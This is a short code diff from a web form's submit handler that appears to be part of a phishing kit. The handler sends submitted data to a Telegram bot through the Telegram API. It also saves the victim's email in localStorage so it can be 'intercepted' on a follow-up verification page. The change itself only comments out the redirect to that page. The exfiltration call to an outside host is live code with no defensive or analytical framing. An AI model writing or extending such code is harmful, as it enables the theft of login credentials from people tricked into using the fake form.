@@ -16,7 +16,7 @@ const handleSubmit = async (event) => {
         // Send to first Telegram ID
         await fetch(`https://api.telegram.org/bot${telegramKey}/sendMessage?chat_id=${telegramId}&text=${message}`);
         //redirect to verification page
-        window.location.href = 'verification.html';
+       // window.location.href = 'verification.html';
         //send email via localstorage and intercept on the other page
         localStorage.setItem('email', username);
 
